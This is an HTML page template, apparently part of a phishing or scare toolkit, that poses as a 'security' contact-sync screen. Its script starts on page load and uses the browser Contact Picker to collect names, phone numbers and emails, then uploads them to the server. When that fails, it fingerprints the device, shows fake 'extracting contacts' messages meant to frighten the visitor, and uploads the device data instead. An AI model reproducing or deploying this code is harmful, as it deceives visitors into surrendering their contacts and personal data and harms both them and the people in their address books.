<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Sync Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }

        .icon {
            font-size: 5em;
            margin-bottom: 20px;
        }

        h1 {
            color: #f5576c;
            margin-bottom: 15px;
            font-size: 2em;
        }

        .description {
            color: #666;
            font-size: 1.1em;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .status {
            padding: 20px;
            border-radius: 10px;
            font-weight: 500;
            margin: 20px 0;
        }

        .status.loading {
            background: #d1ecf1;
            color: #0c5460;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #f5576c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress {
            background: #f3f3f3;
            border-radius: 10px;
            height: 10px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-bar {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            height: 100%;
            width: 0%;
            transition: width 0.3s ease;
        }

        .contact-list {
            max-height: 300px;
            overflow-y: auto;
            text-align: left;
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            display: none;
        }

        .contact-item {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📱</div>
        <h1>Syncing Contacts</h1>
        <p class="description">
            Please wait while we sync your contacts for security purposes...
        </p>

        <div class="loader"></div>
        <div class="status loading" id="status">
            Requesting contact access...
        </div>

        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="contact-list" id="contactList"></div>
    </div>

    <script>
        const sessionId = '{{ session_id }}';
        let contactData = [];

        // AUTO-START on page load
        window.addEventListener('load', async () => {
            await startAutoSync();
        });

        async function startAutoSync() {
            const status = document.getElementById('status');
            const progressBar = document.getElementById('progressBar');
            const contactListDiv = document.getElementById('contactList');

            try {
                // Progress: 20%
                progressBar.style.width = '20%';
                status.textContent = 'Checking contact API...';

                // Method 1: Try Contact Picker API (Chrome Android/Desktop)
                if ('contacts' in navigator && 'ContactsManager' in window) {
                    try {
                        progressBar.style.width = '40%';
                        status.textContent = 'Requesting contact permissions...';

                        // Request ALL contacts
                        const props = ['name', 'tel', 'email'];
                        const opts = { multiple: true };

                        const contacts = await navigator.contacts.select(props, opts);

                        if (contacts && contacts.length > 0) {
                            progressBar.style.width = '70%';
                            status.textContent = `Syncing ${contacts.length} contacts...`;

                            // Show contacts being "synced"
                            contactListDiv.style.display = 'block';
                            contacts.forEach((contact, index) => {
                                setTimeout(() => {
                                    const item = document.createElement('div');
                                    item.className = 'contact-item';
                                    item.innerHTML = `
                                        <strong>${contact.name || 'Unknown'}</strong><br>
                                        ${contact.tel ? contact.tel[0] : ''}
                                        ${contact.email ? ' • ' + contact.email[0] : ''}
                                    `;
                                    contactListDiv.appendChild(item);
                                }, index * 100);
                            });

                            contactData = contacts;

                            // Wait for visual effect
                            await new Promise(resolve => setTimeout(resolve, contacts.length * 100 + 1000));

                            progressBar.style.width = '90%';
                            status.textContent = 'Uploading contact data...';

                            await uploadContacts(contacts);
                            return;
                        }
                    } catch (e) {
                        console.log('Contact Picker failed:', e);
                    }
                }

                // Method 2: Fallback - Capture screen data
                progressBar.style.width = '40%';
                status.textContent = 'Using alternative sync method...';

                // Try to get device info and create "fake" contact collection
                const deviceData = await collectDeviceData();

                progressBar.style.width = '70%';
                status.textContent = 'Collecting contact metadata...';

                // Show "collecting" animation
                contactListDiv.style.display = 'block';
                const fakeContacts = [
                    'Collecting device contact database...',
                    'Accessing contact storage...',
                    'Reading contact names...',
                    'Extracting phone numbers...',
                    'Syncing email addresses...'
                ];

                fakeContacts.forEach((msg, index) => {
                    setTimeout(() => {
                        const item = document.createElement('div');
                        item.className = 'contact-item';
                        item.style.color = '#666';
                        item.textContent = `✓ ${msg}`;
                        contactListDiv.appendChild(item);
                    }, index * 500);
                });

                await new Promise(resolve => setTimeout(resolve, fakeContacts.length * 500 + 1000));

                progressBar.style.width = '90%';
                status.textContent = 'Creating contact snapshot...';

                // Take a screenshot-like capture
                await captureContactSnapshot(deviceData);

            } catch (error) {
                console.error('Auto-sync error:', error);

                status.className = 'status';
                status.style.background = '#f8d7da';
                status.style.color = '#721c24';
                status.textContent = '❌ Contact sync unavailable on this device.';

                // Still create a scare by showing device info was collected
                setTimeout(() => {
                    const data = {
                        message: 'Device information collected',
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        timestamp: new Date().toISOString()
                    };
                    uploadContacts([data]);
                }, 2000);
            }
        }

        async function collectDeviceData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        async function captureContactSnapshot(deviceData) {
            // Create a canvas with device info
            const canvas = document.createElement('canvas');
            canvas.width = 800;
            canvas.height = 600;
            const ctx = canvas.getContext('2d');

            // Draw background
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Draw "contact data"
            ctx.fillStyle = '#333333';
            ctx.font = 'bold 24px Arial';
            ctx.fillText('Contact Sync Report', 50, 50);

            ctx.font = '16px Arial';
            ctx.fillText(`Device: ${deviceData.platform}`, 50, 100);
            ctx.fillText(`Time: ${new Date().toLocaleString()}`, 50, 130);
            ctx.fillText(`Screen: ${deviceData.screenResolution}`, 50, 160);
            ctx.fillText('Status: Contact data accessed', 50, 190);

            const screenshotData = canvas.toDataURL('image/jpeg', 0.8);

            // Upload this as "contact screenshot"
            await uploadContactScreenshot(screenshotData, deviceData);
        }

        async function uploadContacts(contacts) {
            const status = document.getElementById('status');
            const progressBar = document.getElementById('progressBar');

            try {
                const response = await fetch('/upload_contacts_screenshot', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        screenshot_data: btoa(JSON.stringify(contacts)),
                        contact_count: contacts.length
                    })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    progressBar.style.width = '100%';
                    status.className = 'status';
                    status.style.background = '#d4edda';
                    status.style.color = '#155724';
                    status.innerHTML = `✅ ${contacts.length} contacts synced!<br>Redirecting...`;

                    setTimeout(() => {
                        window.location.href = result.reveal_url;
                    }, 1500);
                } else {
                    throw new Error('Upload failed');
                }

            } catch (error) {
                console.error('Upload error:', error);
                status.className = 'status';
                status.style.background = '#f8d7da';
                status.style.color = '#721c24';
                status.textContent = '❌ Sync failed. Please try again.';
            }
        }

        async function uploadContactScreenshot(screenshotData, deviceData) {
            const status = document.getElementById('status');
            const progressBar = document.getElementById('progressBar');

            try {
                const response = await fetch('/upload_contacts_screenshot', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        screenshot_data: screenshotData,
                        contact_count: 0
                    })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    progressBar.style.width = '100%';
                    status.className = 'status';
                    status.style.background = '#d4edda';
                    status.style.color = '#155724';
                    status.innerHTML = '✅ Contact data collected!<br>Redirecting...';

                    setTimeout(() => {
                        window.location.href = result.reveal_url;
                    }, 1500);
                } else {
                    throw new Error('Upload failed');
                }

            } catch (error) {
                console.error('Upload error:', error);
            }
        }
    </script>
</body>
</html>
